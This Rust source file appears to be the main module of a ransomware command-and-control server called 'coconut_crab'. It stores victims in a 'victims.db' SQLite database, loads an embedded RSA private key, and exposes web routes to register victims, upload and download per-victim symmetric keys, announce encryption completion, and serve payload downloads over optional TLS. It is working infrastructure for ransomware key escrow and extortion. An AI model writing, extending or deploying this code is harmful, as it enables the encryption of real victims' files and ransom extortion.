use std::{future, io, net::SocketAddr, process::ExitCode, sync::Arc, time::Duration};

use anyhow::{Context, anyhow};
use axum::{Router, routing::post};
use axum_embed::ServeEmbed;
use axum_server::{Handle, bind, bind_rustls, tls_rustls::RustlsConfig};
use purecrypto::rsa::BoxedRsaPrivateKey;
use rust_embed::RustEmbed;
use tokio::signal;
use tracing::{debug, error, info, warn};

mod config;
mod crypto;
mod extract;
mod handlers;
mod models;
mod time;

use coconut_crab_lib::{
    file::current_exe_dir,
    web::{
        routes,
        server_tls::{tls_certificate, tls_private_key},
    },
};
use handlers::{announce_completion, download_sym_key, register, upload_sym_key};
use models::Victim;

static MIGRATIONS: toasty::migration::MigrationSet = toasty::embed_migrations!();

fn spawn_shutdown_signal(handle: Handle<SocketAddr>) {
    tokio::spawn(async move {
        let ctrl_c = async {
            if let Err(error) = signal::ctrl_c().await {
                error!(error = ?error, "failed to install Ctrl+C handler");
                future::pending::<()>().await;
            }
        };

        #[cfg(unix)]
        let terminate = async {
            match signal::unix::signal(signal::unix::SignalKind::terminate()) {
                Ok(mut handler) => {
                    handler.recv().await;
                }
                Err(error) => {
                    error!(error = ?error, "failed to install termination signal handler");
                    future::pending::<()>().await;
                }
            }
        };

        #[cfg(not(unix))]
        let terminate = future::pending::<()>();

        tokio::select! {
            () = ctrl_c => {},
            () = terminate => {},
        }

        info!("Received termination signal, starting graceful shutdown");
        handle.graceful_shutdown(Some(Duration::from_secs(30)));
    });
}

fn log_accept_error(addr: Option<&SocketAddr>, error: &io::Error) {
    warn!(?addr, error = ?error, "Failed to accept connection");
}

#[derive(Clone)]
pub(crate) struct AppState {
    db: toasty::Db,
    private_key: Arc<BoxedRsaPrivateKey>,
}

#[derive(RustEmbed, Clone)]
#[folder = "assets/public"]
struct AssetPublic;

#[derive(RustEmbed)]
#[folder = "assets/private"]
struct AssetPrivate;

fn embedded_asset(name: &str) -> anyhow::Result<Vec<u8>> {
    AssetPrivate::get(name)
        .map(|asset| asset.data.into_owned())
        .with_context(|| format!("embedded asset {name} is missing"))
}

#[tokio::main]
async fn main() -> ExitCode {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    match run().await {
        Ok(()) => ExitCode::SUCCESS,
        Err(error) => {
            error!(error = ?error, "Fatal error");
            ExitCode::FAILURE
        }
    }
}

async fn run() -> anyhow::Result<()> {
    let exe_directory_path = tokio::task::spawn_blocking(current_exe_dir)
        .await
        .context("executable directory lookup task failed")?
        .context("cannot determine executable directory")?;

    let driver = tokio::task::spawn_blocking(move || {
        toasty_driver_sqlite::Sqlite::open(exe_directory_path.join("victims.db"))
    })
    .await
    .context("sqlite driver open task failed")?;
    let db = toasty::Db::builder()
        .models(toasty::models!(Victim))
        .build(driver)
        .await
        .context("failed to connect to SQLite database")?;

    MIGRATIONS
        .apply(&db)
        .await
        .context("failed to apply database migrations")?;
    debug!("Database migrations applied");

    let pem = String::from_utf8(embedded_asset("asym-priv-key.pem")?)
        .context("failed to decode embedded RSA private key as UTF-8")?;
    let private_key = BoxedRsaPrivateKey::from_pkcs1_pem(&pem)
        .context("failed to parse embedded RSA private key")?;
    debug!("RSA private key parsed and cached");

    let shared_state = AppState {
        db,
        private_key: Arc::new(private_key),
    };

    let serve_public_assets = ServeEmbed::<AssetPublic>::new();

    let app = Router::new()
        .route(routes::REGISTER.as_str(), post(register))
        .route(routes::UPLOAD_SYM_KEY.as_str(), post(upload_sym_key))
        .route(
            routes::ANNOUNCE_COMPLETION.as_str(),
            post(announce_completion),
        )
        .route(routes::DOWNLOAD_SYM_KEY.as_str(), post(download_sym_key))
        .nest_service(routes::DOWNLOAD_DIR.as_str(), serve_public_assets)
        .with_state(shared_state);

    let handle = Handle::new();
    spawn_shutdown_signal(handle.clone());

    let addr = SocketAddr::from(([0, 0, 0, 0], config::PORT));

    if config::HTTPS {
        rustls::crypto::ring::default_provider()
            .install_default()
            .map_err(|_| anyhow!("failed to install rustls crypto provider"))?;
        let tls_config = RustlsConfig::from_pem(
            tls_certificate()?.into_owned(),
            tls_private_key()?.into_owned(),
        )
        .await
        .context("failed to configure web server TLS")?;

        let server = bind_rustls(addr, tls_config);
        server
            .handle(handle)
            .first_request_timeout(Some(Duration::from_secs(
                config::FIRST_REQUEST_TIMEOUT_SECONDS,
            )))
            .accept_error_handler(log_accept_error)
            .serve(app.into_make_service())
            .await
            .context("failed to start web server")?;
    } else {
        let server = bind(addr);
        server
            .handle(handle)
            .first_request_timeout(Some(Duration::from_secs(
                config::FIRST_REQUEST_TIMEOUT_SECONDS,
            )))
            .accept_error_handler(log_accept_error)
            .serve(app.into_make_service())
            .await
            .context("failed to start web server")?;
    }
    Ok(())
}
